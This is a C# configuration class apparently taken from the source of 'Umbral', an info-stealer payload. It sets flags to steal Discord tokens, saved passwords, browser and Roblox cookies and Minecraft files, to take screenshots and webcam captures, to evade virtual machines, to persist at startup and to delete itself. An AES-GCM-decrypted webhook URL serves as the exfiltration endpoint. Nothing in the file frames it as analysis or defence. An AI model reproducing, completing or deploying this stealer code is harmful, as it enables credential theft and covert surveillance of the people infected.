using System;
using System.Linq;
using System.Text;
using Umbral.payload.Handlers;

namespace Umbral.payload.Config
{
    internal static class Settings
    {
        internal static readonly string WebhookUrl;

        internal static readonly bool Ping;

        internal static readonly string Version;

        internal static readonly bool AntiVm;

        internal static readonly bool Startup;

        internal static readonly bool StealDiscordtokens;

        internal static readonly bool StealPasswords;

        internal static readonly bool StealCookies;

        internal static readonly bool StealRobloxCookies;

        internal static readonly bool StealMinecraftFiles;

        internal static readonly bool TakeScreenshot;

        internal static readonly bool DeleteSelf;

        internal static readonly bool CaptureWebcam;

        internal static readonly string Mutex;

        static Settings()
        {
            //--------------------------------------
            //----------------CONFIG----------------
            //--------------------------------------

            string webhookUrl = "";
            bool ping = true;
            string version = "0.1";
            bool antiVm = false;
            bool startup = false;
            bool stealPasswords = true;
            bool stealCookies = true;
            bool stealRobloxCookies = true;
            bool stealMinecraftFiles = true;
            bool stealDiscordTokens = true;
            bool takeScreenshot = true;
            bool deleteSelf = false;
            bool captureWebcam = true;

            //--------------------------------------

            string mutex = "ThisIsAUniQueMuTex";
            string key = "";
            string iv = "";

            WebhookUrl = Decrypt(webhookUrl, key, iv);
            Ping = ping;
            Version = Decrypt(version, key, iv);
            AntiVm = antiVm;
            Startup = startup;
            StealDiscordtokens = stealDiscordTokens;
            StealPasswords = stealPasswords;
            StealCookies = stealCookies;
            StealRobloxCookies = stealRobloxCookies;
            StealMinecraftFiles = stealMinecraftFiles;
            TakeScreenshot = takeScreenshot;
            DeleteSelf = deleteSelf;
            CaptureWebcam = captureWebcam;
            Mutex = mutex;
        }

        static private string Decrypt(string encrypted, string _key, string _iv)
        {
            byte[] buffer = Convert.FromBase64String(encrypted);
            byte[] key = Convert.FromBase64String(_key);
            byte[] iv = Convert.FromBase64String(_iv);

            byte[] cipherText = buffer.Take(buffer.Length - 16).ToArray();
            byte[] tag = buffer.Skip(buffer.Length - 16).ToArray();

            return Encoding.UTF8.GetString(new AesGcm().Decrypt(key, iv, null, cipherText, tag));
        }
    }
}